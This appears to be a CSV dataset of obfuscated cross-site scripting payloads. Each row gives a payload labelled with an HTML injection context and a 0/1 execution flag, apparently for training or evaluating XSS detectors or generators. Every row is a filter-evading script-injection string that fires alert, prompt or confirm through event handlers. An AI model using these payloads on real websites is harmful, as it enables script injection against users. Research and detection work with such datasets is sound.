payload,context,exec,combined
"<DEtailS%0doNToGGLe%0a=%0aa=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DEtailS%0doNToGGLe%0a=%0aa=prompt,a()>"
<a%0aoNpoINTEreNTeR%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aoNpoINTEreNTeR%09=%09(prompt)``>v3dm0s
"<DETaiLs%0dONtOGGLE%09=%09a=prompt,a()%0dx>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DETaiLs%0dONtOGGLE%09=%09a=prompt,a()%0dx>"
<DetAiLS%0donPoINTeRENTER%09=%09(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetAiLS%0donPoINTeRENTER%09=%09(prompt)``//
"<DetAILs%09oNtOGgLE%0a=%0aa=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DetAILs%09oNtOGgLE%0a=%0aa=prompt,a()%0dx>"
<html%0dONmOuSeovER+=+[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <html%0dONmOuSeovER+=+[8].find(confirm)%0dx//
<HtML%0aOnPoiNtereNtER%09=%09confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtML%0aOnPoiNtereNtER%09=%09confirm()>
<a%0dONMOusEovER%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dONMOusEovER%09=%09confirm()>v3dm0s
<HtMl/+/OnMOUSeOVEr%09=%09(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtMl/+/OnMOUSeOVEr%09=%09(confirm)()%0dx>
<d3V%0aoNMOuSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aoNMOuSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s
"<A%0aoNMoUsEoVER%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%0aoNMoUsEoVER%09=%09a=prompt,a()%0dx>v3dm0s"
<dETailS%0dontoGglE+=+confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETailS%0dontoGglE+=+confirm()%0dx//
<d3V%0doNMoUSeOveR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0doNMoUSeOveR%09=%09confirm()>v3dm0s
"<DETAiLs%0dONtOGGLE+=+a=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DETAiLs%0dONtOGGLE+=+a=prompt,a()%0dx//"
"<d3v%0donpOinteRENtER%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0donpOinteRENtER%09=%09a=prompt,a()%0dx>v3dm0s"
<d3V%0dOnpOiNTeREnter%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0dOnpOiNTeREnter%09=%09[8].find(confirm)%0dx>v3dm0s
<a/+/OnPOINteRenTEr%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnPOINteRenTEr%0a=%0aconfirm()>v3dm0s
<d3V%0aONpoINtereNTeR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aONpoINtereNTeR%0d=%0d(prompt)``>v3dm0s
<html%0aonpoInTERENtEr%0a=%0aconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <html%0aonpoInTERENtEr%0a=%0aconfirm()%0dx>
<HtML%09oNmOuseoVer+=+confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtML%09oNmOuseoVer+=+confirm()>
<hTml%09ONmoUSeOVER%0d=%0d(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTml%09ONmoUSeOVER%0d=%0d(confirm)()//
<a%09OnMOUsEOvEr+=+confirm()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%09OnMOUsEOvEr+=+confirm()%0dx>v3dm0s
<a/+/ONmouSEOver%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/ONmouSEOver%09=%09(confirm)()%0dx>v3dm0s
<d3V/+/ONmoUSEOVeR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/ONmoUSEOVeR%0a=%0a[8].find(confirm)>v3dm0s
<a%0dOnMoUSeOver%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dOnMoUSeOver%0d=%0d(confirm)()%0dx>v3dm0s
<A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s
<DETaiLS%0dontOGglE%0d=%0d(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETaiLS%0dontOGglE%0d=%0d(confirm)()%0dx>
<dEtAiLs/+/oNPOINTerEntEr%0d=%0dconfirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtAiLs/+/oNPOINTerEntEr%0d=%0dconfirm()>
<svg/onload=alert(1)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <svg/onload=alert(1)>
<HTML%09ONMoUSEOvEr%0a=%0a(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTML%09ONMoUSEOvEr%0a=%0a(confirm)()>
<DETAILs%09ONPoiNTEREnteR+=+(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETAILs%09ONPoiNTEREnteR+=+(prompt)``%0dx>
<htmL%0dOnPoinTERenter+=+(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htmL%0dOnPoinTERenter+=+(confirm)()%0dx//
<a%0aOnPointErEntEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aOnPointErEntEr%0a=%0aconfirm()%0dx>v3dm0s
"<HtMl%09onmOuseOvEr%0d=%0da=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <HtMl%09onmOuseOvEr%0d=%0da=prompt,a()>"
<a%09onPoinTERenter%0a=%0a(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09onPoinTERenter%0a=%0a(prompt)``>v3dm0s
<D3v%0aOnMOuSEOvER%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnMOuSEOvER%09=%09(prompt)``%0dx>v3dm0s
"<DETAiLS%0aontoggLE+=+a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DETAiLS%0aontoggLE+=+a=prompt,a()>"
<Html/+/OnpoINteREnTEr%09=%09confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <Html/+/OnpoINteREnTEr%09=%09confirm()//
<D3V/+/onpOINteRenter%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/onpOINteRenter%09=%09[8].find(confirm)>v3dm0s
<A%0aOnpOiNTEREnTer%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aOnpOiNTEREnTer%0d=%0d(confirm)()%0dx>v3dm0s
"<htMl%0dOnMOusEOver%0a=%0aa=prompt,a()%0dx>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <htMl%0dOnMOusEOver%0a=%0aa=prompt,a()%0dx>"
<HtmL/+/oNmousEoVER%0a=%0a[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtmL/+/oNmousEoVER%0a=%0a[8].find(confirm)>
<hTMl%0aONPOinTERentER%09=%09[8].find(confirm)//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl%0aONPOinTERentER%09=%09[8].find(confirm)//
<dEtAiLs%0dONpOinTereNtER%0a=%0aconfirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtAiLs%0dONpOinTereNtER%0a=%0aconfirm()//
<d3v/+/OnpoiNTeREnTeR%0a=%0a(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/OnpoiNTeREnTeR%0a=%0a(prompt)``>v3dm0s
<HtmL%0aoNMOuSEoveR%0a=%0a[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%0aoNMOuSEoveR%0a=%0a[8].find(confirm)>
"<D3v%0doNmOUSeOVeR%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3v%0doNmOUSeOVeR%0a=%0aa=prompt,a()%0dx>v3dm0s"
<d3V%0donPOINTEReNTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0donPOINTEReNTer%0d=%0dconfirm()%0dx>v3dm0s
<a/+/OnPOINterEnTer%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/OnPOINterEnTer%09=%09(prompt)``%0dx>v3dm0s
<A/+/onPoIntEREnTeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/onPoIntEREnTeR%0a=%0aconfirm()>v3dm0s
<htmL/+/OnMOuseoVER%0d=%0d(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htmL/+/OnMOuseoVER%0d=%0d(confirm)()>
<dETaIls%0dONpOInTereNter%0a=%0a(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETaIls%0dONpOInTereNter%0a=%0a(confirm)()%0dx//
<DetAils%0aOnPoINTERenTer+=+[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetAils%0aOnPoINTERenTer+=+[8].find(confirm)>
<d3v/+/ONPoINTereNTer%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/ONPoINTereNTer%09=%09[8].find(confirm)%0dx>v3dm0s
<A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
<D3V/+/ONpOintereNter+=+(confirm)()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/ONpOintereNter+=+(confirm)()>v3dm0s
<D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s
<deTails/+/oNTOGgle%0a=%0a(confirm)()>,html_text,1,CTX_html_text CTX_html_text CTX_html_text <deTails/+/oNTOGgle%0a=%0a(confirm)()>
"<a%0aONpOIntEreNteR%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0aONpOIntEreNteR%0d=%0da=prompt,a()>v3dm0s"
<d3v%0aoNpOInTErEnTEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0aoNpOInTErEnTEr%0d=%0d[8].find(confirm)>v3dm0s
<hTmL/+/oNpoiNTeRenteR+=+(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTmL/+/oNpoiNTeRenteR+=+(prompt)``%0dx//
<D3V%09OnpOINTErENtER%0a=%0a(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09OnpOINTErENtER%0a=%0a(confirm)()>v3dm0s
<A/+/OnmoUSEovEr%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/OnmoUSEovEr%0a=%0aconfirm()>v3dm0s
<D3v%0aOnpoiNtErENTeR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnpoiNtErENTeR%0d=%0d[8].find(confirm)%0dx>v3dm0s
<D3V/+/OnmoUSeoVer%09=%09(confirm)()>v3dm0s,html_attribute,0,CTX_html_attribute CTX_html_attribute CTX_html_attribute <D3V/+/OnmoUSeoVer%09=%09(confirm)()>v3dm0s
<d3V%0dONmoUSEOVER%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dONmoUSEOVER%09=%09(prompt)``>v3dm0s
<A%0dOnmOuseOveR%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0dOnmOuseOveR%0d=%0dconfirm()>v3dm0s
<HTml/+/OnmousEoVeR+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTml/+/OnmousEoVeR+=+confirm()//
<script>\u0061lert(1)</script>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <script>\u0061lert(1)</script>
"<htmL%0dONmoUsEOveR%09=%09a=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <htmL%0dONmoUsEOveR%09=%09a=prompt,a()>"
</pre><marquee onmouseover=alert(1)>hover me</marquee,html_text,0,CTX_html_text CTX_html_text CTX_html_text </pre><marquee onmouseover=alert(1)>hover me</marquee
<html%0aOnmOUSeoveR%0d=%0d(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <html%0aOnmOUSeoveR%0d=%0d(prompt)``%0dx//
<A%0dONMouSeOVer%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0dONMouSeOVer%0a=%0a[8].find(confirm)>v3dm0s
"<detaIlS%0dontOggLe%09=%09a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <detaIlS%0dontOggLe%09=%09a=prompt,a()>"
<HtML/+/oNpOiNtereNteR+=+confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtML/+/oNpOiNtereNteR+=+confirm()%0dx//
<a%0dOnPoinTeREntER%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dOnPoinTeREntER%09=%09confirm()%0dx>v3dm0s
<d3V/+/onMoUsEOVEr%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/onMoUsEOVEr%09=%09(confirm)()>v3dm0s
<A%09onMOusEOVeR%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09onMOusEOVeR%0d=%0d[8].find(confirm)>v3dm0s
<DetAils/+/oNTOggLe%0a=%0a(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetAils/+/oNTOggLe%0a=%0a(confirm)()%0dx//
<d3V%0aONpoinTERenter%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aONpoinTERenter%09=%09confirm()%0dx>v3dm0s
<D3v%0doNMOuSEovER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0doNMOuSEovER%0d=%0dconfirm()%0dx>v3dm0s
<A%0dONpoInTerEnTer+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dONpoInTerEnTer+=+confirm()>v3dm0s
<d3v%09oNMOUsEOVer%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%09oNMOUsEOVer%09=%09confirm()>v3dm0s
<D3V/+/ONMOUSEOVEr+=+(confirm)()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3V/+/ONMOUSEOVEr+=+(confirm)()%0dx>v3dm0s
<D3V%0aonPOinTErENter+=+[8].find(confirm)%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3V%0aonPOinTErENter+=+[8].find(confirm)%0dx>v3dm0s
<HtML%0dONpOINterenter%0a=%0aconfirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtML%0dONpOINterenter%0a=%0aconfirm()>
<Details%0aOnPOInTErEnteR%0d=%0d(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <Details%0aOnPOInTErEnteR%0d=%0d(prompt)``%0dx//
<a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s
<A/+/OnPOINTeRenTEr%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/OnPOINTeRenTEr%09=%09(confirm)()>v3dm0s
<HTmL%0dONmOuSEOveR%0a=%0aconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTmL%0dONmOuSEOveR%0a=%0aconfirm()%0dx>
<d3V%0dONmOuSeOver%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0dONmOuSeOver%0a=%0a[8].find(confirm)%0dx>v3dm0s
"<HtMl%09OnMOUSeOVEr%0a=%0aa=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HtMl%09OnMOUSeOVEr%0a=%0aa=prompt,a()>"
<A%0aonMOUSeOVEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aonMOUSeOVEr%0d=%0d(confirm)()>v3dm0s
<a%0dOnpointerenTEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dOnpointerenTEr%0d=%0d(prompt)``%0dx>v3dm0s
<A/+/ONMOUSeOver%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/ONMOUSeOver%09=%09(confirm)()>v3dm0s
<A%09onMoUsEOVER%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09onMoUsEOVER%09=%09confirm()%0dx>v3dm0s
<dETAILS%09onTOGglE%0d=%0d(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAILS%09onTOGglE%0d=%0d(prompt)``//
<D3v%0dOnMOUSeOveR+=+(prompt)``>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0dOnMOUSeOveR+=+(prompt)``>v3dm0s
<htML/+/oNpOintErEnter%09=%09confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htML/+/oNpOintErEnter%09=%09confirm()%0dx//
<d3v%09OnpoiNteRentER%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%09OnpoiNteRentER%0d=%0dconfirm()>v3dm0s
<D3V%0aonmoUsEOver+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aonmoUsEOver+=+[8].find(confirm)%0dx>v3dm0s
<htMl%0aonpOInTEREnteR%0d=%0dconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htMl%0aonpOInTEREnteR%0d=%0dconfirm()%0dx//
<D3V%0dOnMOusEOvEr%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0dOnMOusEOvEr%0d=%0dconfirm()>v3dm0s
<D3v%0aOnpOIntereNTEr%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnpOIntereNTEr%0d=%0d(confirm)()%0dx>v3dm0s
<d3V%0aOnpOINTerEnTeR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0aOnpOINTerEnTeR%0a=%0a[8].find(confirm)>v3dm0s
<D3V%09OnmOUsEoVEr%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09OnmOUsEoVEr%09=%09[8].find(confirm)>v3dm0s
"<hTML%09ONmoUSeovER%0d=%0da=prompt,a()%0dx>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <hTML%09ONmoUSeovER%0d=%0da=prompt,a()%0dx>"
<A%0doNMoUSeoVER%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0doNMoUSeoVER%09=%09[8].find(confirm)>v3dm0s
"<A%0aoNmouSEOvEr%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0aoNmouSEOvEr%0d=%0da=prompt,a()>v3dm0s"
<a%0dONMoUSeOver+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dONMoUSeOver+=+confirm()>v3dm0s
<dETaiLs/+/OnpoInTeRenTEr%09=%09(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETaiLs/+/OnpoInTeRenTEr%09=%09(prompt)``%0dx>
<d3V%0aONPointeRENtER%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aONPointeRENtER%0d=%0dconfirm()>v3dm0s
<dETAiLS%0donPointErenTER%0a=%0a(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAiLS%0donPointErenTER%0a=%0a(prompt)``%0dx//
<D3V%0aoNpoiNTERentER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aoNpoiNTERentER%0d=%0dconfirm()%0dx>v3dm0s
<img src=x onerror>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <img src=x onerror>
"<D3v%0aONPOiNtErEnTer%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aONPOiNtErEnTer%0d=%0da=prompt,a()%0dx>v3dm0s"
"<d3V%0aONpoInteRENTER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aONpoInteRENTER%0a=%0aa=prompt,a()%0dx>v3dm0s"
<DetAilS%0aOnPOiNTerEnteR+=+[8].find(confirm)%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DetAilS%0aOnPOiNTerEnteR+=+[8].find(confirm)%0dx//
<d3V%0aOnmOUSeOvEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0aOnmOUSeOvEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<DETAiLS%0aOnPOInteRenTER%09=%09confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETAiLS%0aOnPOInteRenTER%09=%09confirm()>
<A/+/ONPoINTEreNTeR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/ONPoINTEreNTeR%09=%09confirm()>v3dm0s
"<A%0aonMoUseOVeR%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0aonMoUseOVeR%0a=%0aa=prompt,a()%0dx>v3dm0s"
<a/+/OnMousEoVER%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnMousEoVER%0d=%0d(confirm)()%0dx>v3dm0s
<D3V/+/onMOUSEOvER%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/onMOUSEOvER%09=%09(confirm)()%0dx>v3dm0s
<detaIls%0aONpOiNterENtER%0d=%0d(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detaIls%0aONpOiNterENtER%0d=%0d(prompt)``//
<a/+/ONPOInTeREnter%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/ONPOInTeREnter%0a=%0a[8].find(confirm)>v3dm0s
<a%0aOnMOuSEoVEr%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aOnMOuSEoVEr%0a=%0a(confirm)()%0dx>v3dm0s
<d3v/+/oNpOInTeReNtEr%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/oNpOInTeReNtEr%09=%09(prompt)``%0dx>v3dm0s
<a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s
<htML/+/OnMOUSeOveR%0a=%0a(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htML/+/OnMOUSeOveR%0a=%0a(prompt)``%0dx//
<d3V/+/ONmOUseOver%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/ONmOUseOver%0a=%0aconfirm()%0dx>v3dm0s
<d3v%0dONMouSEoVeR%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0dONMouSEoVeR%09=%09confirm()%0dx>v3dm0s
<detaIlS/+/ontoGGle+=+[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detaIlS/+/ontoGGle+=+[8].find(confirm)>
<A%0aonMousEoVEr%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aonMousEoVEr%09=%09confirm()>v3dm0s
"<DEtaILS%0dontOGgle%0a=%0aa=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DEtaILS%0dontOGgle%0a=%0aa=prompt,a()%0dx>"
"<dETaiLS%09ontOGGle+=+a=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dETaiLS%09ontOGGle+=+a=prompt,a()>"
<a%0dONmOuSEoVeR%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dONmOuSEoVeR%09=%09confirm()>v3dm0s
<A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s
